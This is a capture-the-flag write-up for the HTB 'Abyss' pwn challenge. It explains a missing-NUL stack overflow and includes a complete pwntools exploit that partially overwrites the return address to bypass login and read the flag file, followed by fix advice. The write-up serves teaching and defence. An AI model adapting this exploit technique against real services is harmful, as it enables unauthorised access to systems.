Abyss is an Easy **Pwn** challenge from HTB Business CTF 2024. A login server reads your input but forgets one tiny thing — to NUL-terminate the buffer — and a copy loop happily walks off the end of the stack. The twist is that you can only ever write a *single* NUL byte, which rules out a normal ROP chain. The intended path is a surgical 3-byte partial overwrite of the return address that jumps straight past the login check, abusing the loop counter itself to step over the saved frame pointer.

## Overview

The binary exposes a tiny protocol: send a 4-byte command integer to pick a handler — `LOGIN`, `READ`, or `EXIT`. `READ` is a built-in arbitrary file read (it `open()`s whatever filename you give it and writes the contents back), but it is gated behind a `logged_in` flag. We never learn the random credentials, so instead we corrupt our way directly into the read code with the check already satisfied.

## The technique

`cmd_login()` reads up to 512 bytes into a stack buffer and then copies it byte-by-byte into another buffer:

```c
char buf[512];
char user[512] = {0};
read(0, buf, sizeof(buf));        // never writes a '\0'
if (strncmp(buf, "USER ", 5)) return;
i = 5;
while (buf[i] != '\0') {          // stops only at a NUL byte
    user[i - 5] = buf[i];         // no bound check
    i++;
}
```

If your 512 bytes contain no NUL, the loop never stops at the end of `buf` (which is contiguous with `user` on the stack) — it keeps reading and keeps writing past the end of `user`. This is [improper NUL termination](https://cwe.mitre.org/data/definitions/170.html) ([CWE-170](https://cwe.mitre.org/data/definitions/170.html)) causing a classic [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) ([CWE-787](https://cwe.mitre.org/data/definitions/787.html)).

The catch: the copy loop can emit only **one** NUL byte — the terminator it writes at the very end. Every function address in this No-PIE binary looks like `0x004014eb` = `eb 14 40 00 00 00 00 00`, i.e. five trailing NUL bytes. The moment a write needs a NUL the loop halts, so a multi-gadget ROP chain (each address full of NULs) is impossible. What *is* possible is overwriting just the **low 3 bytes** of the saved return address — the upper bytes are already zero — turning it into a single existing-code address.

We aim that 3-byte partial overwrite at the instruction *inside* `cmd_read` that sits right after the login check:

```
4014e5: mov eax,[logged_in]
4014eb: test eax,eax        <-- return here, skipping the load
4014ed: jne  <do the file read>
```

Landing at `0x4014eb` skips loading `logged_in`; `eax` still holds the non-zero result of the earlier failed `strcmp`, so the branch into the file-read code is taken — login bypassed. That code is rbp-relative and reuses the caller's frame, so **the saved RBP must survive** the overflow.

That is where the loop counter `i` (at `rbp-0x4`) earns its keep. It lives in the overwrite path, so we use two copies: the `USER` copy (NUL-terminated, no overflow) just *plants* a control byte where the next copy's write-pointer will hit `&i`, plus the three return bytes a little earlier. The `PASS` copy then overruns; when its pointer reaches `&i` it writes the planted byte into `i`'s low byte, bumping `i` so the next three writes land exactly on the saved RIP — **jumping over the saved RBP**, which is left intact.

## Solution

The full exploit is a short pwntools script:

```python
#!/usr/bin/env python3
import sys
from pwn import *

HOST, PORT = sys.argv[1], int(sys.argv[2])
RET = 0x4014eb  # cmd_read, AFTER the `test eax,eax` login gate

p = remote(HOST, PORT)

p.send(p32(0))                      # cmd = LOGIN (0) -> enters cmd_login()
p.recvrepeat(0.3)

# USER: NUL-terminated (p32 has a 0x00 tail) so NO overflow here.
# Plants 0x1c @ user[17] and the return bytes \xeb\x14\x40 @ user[29..31].
p.send(b"USER " + b"AAAAAAAABBBBBBBBC\x1cDDDDEEEEEEE" + p32(RET))
p.recvrepeat(0.3)

# PASS: 507 non-NUL bytes fill the 512-byte buf -> the copy overruns.
# When the write-pointer reaches the loop counter i, it reads the planted 0x1c,
# bumps i, and the next 3 writes land on saved RIP (skipping saved RBP).
p.send(b"PASS " + b"D" * (512 - 5))
p.recvrepeat(0.3)

# We are now "logged in" (RIP redirected past the check) -> ask for the flag file.
p.send(b"/app/flag.txt")

print(p.recvrepeat(1.5).decode(errors="replace"))
```

Run it against the instance and it prints the flag:

```bash
python3 solve.py <ip> <port>
# HTB{...}
```

## Why it worked

A single missing `'\0'` after `read()` turned a bounded copy into an unbounded one. The exploitation creativity comes from the *constraint*: with only one writable NUL you cannot stage a ROP chain, so the answer is a minimal 3-byte partial overwrite into existing code, past the authentication gate, while preserving the frame pointer by corrupting the very loop counter that drives the copy.

> Note: `checksec` shows SHSTK/IBT "Enabled", but those CET protections are only flags in the ELF — they are not enforced unless the kernel and CPU support shadow stacks, so the partial-RIP redirect works on a typical host.

## Fix / defense

```c
ssize_t n = read(0, buf, sizeof(buf) - 1);
if (n < 0) return;
buf[n] = '\0';                                   // always terminate
for (int i = 5; buf[i]; i++) {
    if (i - 5 >= (int)sizeof(user) - 1) break;   // bound the copy by dest size
    user[i - 5] = buf[i];
}
```

In order of leverage: always NUL-terminate a buffer after `read()` (the root cause); bound every copy by the destination size, or use `strncpy`/`snprintf` with explicit limits; compile with a stack canary (`-fstack-protector-strong`) so corruption aborts before the return address is used; and enable PIE so partial-overwrite addresses are unknown without a leak.
